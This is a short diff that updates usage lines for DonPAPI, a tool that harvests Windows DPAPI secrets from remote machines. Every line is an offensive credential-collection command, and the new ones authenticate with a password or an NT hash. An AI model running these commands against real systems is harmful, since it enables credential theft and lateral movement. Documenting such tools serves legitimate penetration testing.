@@ -1,1 +1,3 @@
-DonPAPI "$DOMAIN"/"$USER":"$PASSWORD"@"$TARGET"
+donpapi gui
+donpapi collect -u "$USER" -H ":$NT_HASH" -d "$DOMAIN" -t "$TARGET"
+donpapi collect -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -t "$TARGET"
